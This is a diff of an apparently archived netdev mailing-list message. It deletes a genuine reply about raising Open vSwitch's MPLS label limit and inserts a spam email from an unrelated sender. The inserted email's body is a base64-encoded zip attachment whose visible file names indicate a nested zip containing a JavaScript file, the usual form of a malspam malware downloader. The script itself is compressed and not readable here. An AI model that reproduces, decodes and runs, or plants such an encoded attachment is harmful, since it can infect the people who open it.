@@ -1,33 +1,74 @@
-From: =?utf-8?B?0JDQu9C10LrRgdC10Lkg0JHQvtC70LTRi9GA0LXQsg==?=
-        <devel-net-ne-vlezay80@yandex.ru>
-Subject: Re: Maximum MPLS labels on Linux network stack
-Date: Thu, 04 May 2017 00:29:05 +0300
-Message-ID: <454271493846945@web51g.yandex.ru>
-References: <149211493832787@web33j.yandex.ru> <5a408c23-d3e2-aa3e-4574-82521b2255b0@gmail.com>
-         <CAPWQB7FFwBFL9h7JoJMF4FuK7JXLrHfo5yg4aHJ4iczSdNU_bg@mail.gmail.com> <443301493846392@web51g.yandex.ru> <CAPWQB7HrbCVLEjaR0hObPTxrDg8qyfZo-3iYLe=NVzuPTOLxCQ@mail.gmail.com>
+From: <chacoma4018@windstream.net>
+Subject: 52982 netdev
+Date: Wed, 03 May 2017 21:43:11 -0000
+Message-ID: <149384779100.8648.17267554891602887638@infortel.net.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
-Cc: David Ahern <dsahern@gmail.com>, netdev <netdev@vger.kernel.org>
-To: Joe Stringer <joe@ovn.org>
+Content-Type: application/zip; name="182505210954719.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from forward1p.cmail.yandex.net ([77.88.31.16]:53070 "EHLO
-        forward1p.cmail.yandex.net" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1751621AbdECVgt (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Wed, 3 May 2017 17:36:49 -0400
-In-Reply-To: <CAPWQB7HrbCVLEjaR0hObPTxrDg8qyfZo-3iYLe=NVzuPTOLxCQ@mail.gmail.com>
+Received: from static-186-226-171-70.infortel.net.br ([186.226.171.70]:46848
+        "HELO infortel.net.br" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751074AbdECVnS (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Wed, 3 May 2017 17:43:18 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-As I understand it, it's enough to just set the variable in the source
-#define FLOW_MAX_MPLS_LABELS 3
-on
-#define FLOW_MAX_MPLS_LABELS 7
-Or is there somehow still pitfalls?
-
-04.05.2017, 00:22, "Joe Stringer" <joe@ovn.org>:
-> On 3 May 2017 at 14:19, Алексей Болдырев
-> <devel-net-ne-vlezay80@yandex.ru> wrote:
->>  Is it possible to increase this limit in OpenVswitch?
->
-> Yes.
+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
